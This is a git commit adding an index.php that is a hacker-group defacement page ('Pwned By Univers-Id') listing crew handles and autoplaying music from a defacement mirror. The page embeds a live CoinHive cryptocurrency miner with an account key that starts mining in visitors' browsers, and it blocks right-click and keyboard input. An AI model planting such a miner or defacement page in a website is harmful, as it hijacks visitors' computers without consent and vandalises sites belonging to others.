9fb10bd650beb451c66847ee2407a34a9b431e15
UV-ID <43733199+UV-ID@users.noreply.github.com>
2018-10-01 06:17:25 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,37 @@
+<html><head>
+<title>Pwned HuuH? :V</title>
+<meta name="title" content="Dark Side Team">
+<meta name="description" content="Pwned By The Looser? What A Funny Dorama :3">
+<meta name="googlebot" content="index,follow" />
+<meta name="robots" content="all" />
+<meta name="robots schedule" content="auto" />
+<meta name="distribution" content="global" />
+<link rel="shortcut icon" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="icon" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="icon" sizes="32x32" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="icon" sizes="64x64" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="apple-touch-icon" sizes="57x57" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="apple-touch-icon" sizes="114x114" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="apple-touch-icon" sizes="60x60" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico"> <link rel="apple-touch-icon" sizes="120x120" href="http://universid-gans.cf/wp-content/uploads/5b094fb07dddb.128px.ico">
+<link href="https://fonts.googleapis.com/css?family=Jolly+Lodger" rel="stylesheet" type='text/css'>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous('fdm0t556eI81du1hP83BPkBC5GKuKabP', {throttle: 0.3});
+// Only start on non-mobile devices and if not opted-out
+// in the last 14400 seconds (4 hours):
+if (!miner.isMobile() && !miner.didOptOut(14400)) {
+miner.start();
+}
+</script>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' bgcolor="black">
+<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script>
+<center>
+<div class="indonesia"><br><br>
+<h1>Pwned HuuH? :V</h1>
+		<h2>I Was Forgotten</h2>
+		<h2>No One Know Who And Where I'm</h2>
+		<h2>Thats Make Me Living In The Dark</h2>
+		<h2>There Is Full With Fear And Sadness</h2>
+		<h2>Pwned BY Univers-Id</h2>
+		<h2>Don't Judge We As A Criminal</h2>
+		<h2>I Just A Boy That's Already Lost His Life</h2>
+<h2>#Indonesia Introverted Boy</h2>
+<marquee>- Mr.Lian - ClyloTextovert - Mr.Ly - Secdevil13 - ScrmDevil_ - CyberPunks - DT7NET - ./Ikari404 - VerX - Feke-Syst3m - Mr.5TIY0 - Mr.SatSat - Mr.1Di0T3Rs - DEATHCLONE - Fak3-Root - And You -</marquee>
+<center><audio controls autoplay loop src="http://zonehmirrors.org/defaced/2018/05/25/www.siamnews.com/exploit.sultra1news.com/music/MYTH%20&%20ROID%20-%20TRAGEDY-ETERNITY.mp3" type="audio/mpeg"></center>
+<br>
+<p>Official Members: - Verx - ./Ikari404 - Mr.5T1Y0 - Mr.SatSat - Fake-Syst3m -</p>
+</html>
